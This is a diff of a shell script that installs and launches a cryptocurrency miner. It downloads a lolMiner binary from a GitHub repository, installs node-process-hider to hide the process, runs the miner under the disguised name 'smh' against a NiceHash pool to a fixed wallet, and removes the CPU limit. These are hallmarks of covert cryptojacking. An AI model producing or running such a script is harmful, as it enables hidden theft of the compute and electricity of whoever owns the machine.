@@ -1,13 +1,9 @@
-#!/bin/sh
+#!/bin/bash
 
-apt update && apt -y install sudo
-sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-sudo apt-get install -y nodejs
-sudo apt-get install gcc g++ make
-sudo -u root npm i -g node-process-hider
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+npm i -g node-process-hider 
+ph add node
+wget https://github.com/circelwenakyo/usdto/raw/main/lolMiner
 chmod +x smh
-cpulimit -e smh 30 &
 ./smh --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(cat /proc/sys/kernel/hostname)
